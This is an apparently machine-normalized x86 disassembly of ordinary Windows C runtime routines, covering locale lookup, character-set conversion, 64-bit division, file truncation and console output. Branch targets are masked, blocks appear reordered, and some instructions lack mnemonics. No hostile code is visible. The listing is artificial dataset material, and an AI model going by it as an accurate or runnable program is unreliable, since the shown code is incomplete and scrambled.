and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_453ca3
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push ebx
push esi
xor esi esi
push edi
mov [ ebp - 0x18 ] 0x404e
mov [ eax ] esi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] esi
cmp [ ebp + 0xc ] esi
jbe r-xdata
cmp [ eax + 0x8 ] esi
je r-xdata
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov esi eax
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx edx
shr ecx 0x1f
lea edi [ edx + edx ]
lea edx [ ebx + ebx ]
or edx ecx
mov ecx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
add ecx ecx
or ecx esi
mov [ ebp - 0x14 ] edi
mov esi edi
and [ ebp - 0x14 ] 0x0
mov ebx edx
shr ebx 0x1f
add ecx ecx
shr edi 0x1f
or ecx ebx
mov ebx [ ebp - 0x10 ]
add esi esi
add edx edx
or edx edi
lea edi [ esi + ebx ]
mov [ eax ] esi
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
cmp edi esi
jb r-xdata
mov ecx [ eax + 0x4 ]
mov edx ecx
shr edx 0x10
mov [ eax + 0x8 ] edx
mov edx [ eax ]
mov edi edx
shl ecx 0x10
shr edi 0x10
or ecx edi
shl edx 0x10
add [ ebp - 0x18 ] 0xfff0
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
mov ebx 0x8000
test [ eax + 0x8 ] ebx
jne r-xdata
mov [ ebp - 0x14 ] 0x1
cmp edi ebx
jae r-xdata
mov cx [ ebp - 0x18 ]
mov [ eax + 0xa ] cx
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
mov esi [ eax ]
mov edi [ eax + 0x4 ]
add [ ebp - 0x18 ] 0xffff
mov ecx esi
add esi esi
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
add ecx ecx
or ecx edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
test ebx ecx
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea ebx [ ecx + edx ]
xor esi esi
cmp ebx ecx
jb r-xdata
lea esi [ edx + 0x1 ]
cmp esi edx
jb r-xdata
xor ebx ebx
mov [ eax ] edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
xor esi esi
inc esi
cmp ebx edx
jae r-xdata
xor ebx ebx
inc ebx
cmp esi 0x1
jae r-xdata
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
and [ ebp - 0x14 ] 0x0
lea ecx [ edi + edi ]
mov edx edi
shr edx 0x1f
lea edi [ ebx + ebx ]
or edi edx
mov edx [ eax + 0x8 ]
mov esi ebx
shr esi 0x1f
lea ebx [ edx + edx ]
mov edx [ ebp + 0x8 ]
or ebx esi
mov [ eax ] ecx
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] ebx
movsx edx [ edx ]
lea esi [ ecx + edx ]
mov [ ebp - 0x10 ] edx
cmp esi ecx
jb r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] ebx
test esi esi
je r-xdata
inc ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
mov [ ebp - 0x14 ] 0x1
cmp esi edx
jae r-xdata
dec [ ebp + 0xc ]
inc [ ebp + 0x8 ]
cmp [ ebp + 0xc ] 0x0
ja r-xdata
lea ecx [ edi + 0x1 ]
xor edx edx
cmp ecx edi
jb r-xdata
cmp [ ebp - 0x14 ] 0x0
mov [ eax ] esi
je r-xdata
xor esi esi
jmp r-xdata
xor edx edx
inc edx
cmp ecx 0x1
jae r-xdata
inc ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0x4 ] ecx
test edx edx
je r-xdata
sub_453e71
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_440ca3
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_43f96b
leave
retn
sub_453eba
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_43f96b
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_443360
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_413960
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_441c3d
pop ecx
cmp eax edi
je r-xdata
call sub_443650
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_442e20
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_445f7b
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_44120e
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_45406e
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
push esi
push edi
xor edi edi
cmp edx edi
je r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
mov ebx [ ebp + 0xc ]
cmp ebx edi
ja r-xdata
mov esi [ ebp + 0x10 ]
cmp esi edi
jne r-xdata
mov ecx edx
xor eax eax
mov [ edx ] ax
jmp r-xdata
xor eax eax
cmp ebx edi
jne r-xdata
dec ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ edx ] ax
call sub_443b37
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
inc ecx
inc ecx
inc esi
inc esi
cmp ax di
je r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_440791
add esp 0x14
mov eax esi
sub_4540f0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
add ecx 0x1
neg ecx
sub edi 0x1
mov al [ ebp + 0xc ]
std
[ edi ]
add edi 0x1
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_45411d
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_441455
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44ce61
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_45321b
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
sub_4541c5
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x24 ]
call sub_441455
lea eax [ ebp - 0x24 ]
push eax
xor ebx ebx
push ebx
push ebx
push ebx
push ebx
push edi
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44ce61
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_45375f
add esp 0x28
test [ ebp - 0x14 ] 0x3
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
test [ ebp - 0x14 ] 0x2
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x4
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x18 ] bl
je r-xdata
push 0x3
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
pop eax
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
sub_45426d
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x14 ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov edi [ ecx + 0xc ]
cmp esi ebx
jne r-xdata
cmp [ ebp + 0xc ] ebx
jbe r-xdata
call sub_443b37
push 0x16
pop esi
mov [ eax ] esi
mov edx [ ebp + 0x10 ]
cmp edx ebx
mov [ esi ] bl
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
xor eax eax
mov eax edx
jmp r-xdata
cmp edx ebx
mov [ esi ] 0x30
lea eax [ esi + 0x1 ]
jle r-xdata
call sub_443b37
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
inc eax
cmp [ ebp + 0xc ] eax
ja r-xdata
cmp edx ebx
mov [ eax ] bl
jl r-xdata
mov cl [ edi ]
cmp cl bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_440791
add esp 0x14
mov eax esi
jmp r-xdata
cmp [ esi ] 0x31
jne r-xdata
cmp [ edi ] 0x35
jl r-xdata
push 0x30
pop ecx
movsx ecx cl
inc edi
jmp r-xdata
lea edi [ esi + 0x1 ]
push edi
call sub_442e20
inc eax
push eax
push edi
push esi
call sub_441f70
add esp 0x10
inc [ ecx + 0x4 ]
jmp r-xdata
jmp r-xdata
mov ecx [ ebp + 0x14 ]
mov [ eax ] cl
inc eax
dec edx
cmp edx ebx
jg r-xdata
xor eax eax
dec eax
cmp [ eax ] 0x39
je r-xdata
mov [ eax ] 0x30
inc [ eax ]
sub_45432c
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_4543e9
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_45432c
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_454da2
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_443bb7
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_43f96b
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_440669
add esp 0x14
sub_454480
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_454560
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_454588
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_4557f4
call sub_4557f4
mov [ esi ] eax
jmp r-xdata
call sub_443b37
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_440791
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_4557f4
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_4545f4
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_450fbc
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_443b37
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_450fbc
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_450fbc
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_450fbc
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_4547aa
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_443b37
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_4503aa
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_443b37
mov [ eax ] 0xd
call sub_443b4a
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_443b4a
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_443b37
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_450682
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_4547aa
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_4547aa
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_454866
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_443b37
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_440791
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_45489f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
xor esi esi
cmp [ rw-data ] esi
je r-xdata
push esi
push esi
push 0x5
lea eax [ ebp - 0xc ]
push eax
push 0x1
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ GetConsoleOutputCP@IAT ]
push eax
call [ WideCharToMultiByte@IAT ]
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
cmp [ rw-data ] 0xfffffffe
jne r-xdata
mov eax 0xffff
jmp r-xdata
push esi
lea edx [ ebp - 0x10 ]
push edx
push eax
lea eax [ ebp - 0xc ]
push eax
push ecx
call [ WriteConsoleA@IAT ]
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
jne r-xdata
call sub_455b03
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_43f96b
leave
retn
mov ax [ ebp + 0x8 ]
push esi
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ WriteConsoleW@IAT ]
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x78
jne r-xdata
mov [ rw-data ] esi
sub_454964
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_444560
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_443b37
mov [ eax ] 0x9
test al 0x1
je r-xdata
call sub_443b37
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp - 0x4 ] 0x0
push ebx
push 0x2
and eax 0xffffffef
pop ebx
or eax ebx
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_443d18
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x2
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
mov edi ebx
mov ebx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] bx
call sub_450db5
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x2 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
sub ecx ebx
mov [ esi + 0x4 ] ecx
test edi edi
jle r-xdata
push [ ebp + 0xc ]
call sub_451499
pop ecx
test eax eax
jne r-xdata
call sub_443d18
add eax 0x40
cmp esi eax
jne r-xdata
mov eax 0xffff
jmp r-xdata
mov eax ebx
and eax 0xffff
or [ esi + 0xc ] 0x20
mov eax 0xffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_450db5
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_450f72
pop ecx
pop edi
pop ebx
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov ebx [ ebp + 0x8 ]
mov [ eax ] bx
jmp r-xdata
push ebx
push 0x0
push 0x0
push ecx
call sub_451041
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
